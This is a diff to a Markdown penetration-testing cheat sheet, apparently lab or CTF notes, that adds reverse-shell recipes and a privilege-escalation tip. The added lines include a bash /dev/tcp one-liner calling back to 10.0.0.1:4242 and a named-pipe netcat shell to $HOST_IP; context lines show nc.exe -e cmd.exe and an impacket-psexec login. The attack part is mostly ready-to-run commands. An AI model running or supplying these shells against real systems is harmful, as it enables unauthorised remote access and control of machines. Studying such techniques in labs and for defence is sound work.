@@ -77,7 +77,12 @@ Usually associated with redis
 ### Reverse Shells
 > A PHP reverse shell script can be found in usr/share/webshells/php/php-reverse-shell.php
 
-#### Simple Reverse Shell
+#### Simple Reverse Shell (bash)
+```bash
+bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
+```
+
+#### Simple Reverse Shell (NC)
 The simplest way to get a reverse shell on the target machine is using netcat. First, we need to make sure that the target's machine has it installed. If not, we can drop a nc.exe binary on our target machine using ```wget```. For windows machines, this binary can be found in ```usr/share/windows-binaries```.
 
 ##### Getting our nc.exe binary on the target machine
@@ -90,6 +95,14 @@ The simplest way to get a reverse shell on the target machine is using netcat. F
 2. On our target machine using powershell, we run ```./nc.exe -e cmd.exe $HOST_IP 8044```
 
 ```-e cmd.exe``` means execute cmd.exe as it sends it back to us.
+
+Sometimes, -e is not supported. It simply doesn't exist.
+The solution is to redirect the stdin/stdout communication through a pipe.
+```bash 
+cd /tmp
+mknod mypipe p
+/bin/bash 0< /tmp/mypipe | nc $HOST_IP 8044 1> /tmp/mypipe
+```
 
 ### Spawning a Stable Shell
 > This requires that you already have a reverse shell on the target machine
@@ -125,6 +138,9 @@ impacket-psexec administrator:password123@$TARGET_IP
 Often after successfully spawning a reverse shell on a web server we will find ourselves as the user ```www-data```, which is the user web servers use by default for normal operation.
 
 ## Privilege Escalation
+### Running as Root
+You can use ```sudo -l``` to look for binaries that users are allowed to run as root.
+
 ### SUID Binaries
 Occasionally there will be binaries being run on the target machine with the SUID bit. The following command can be used to search for such binaries.
 ```bash
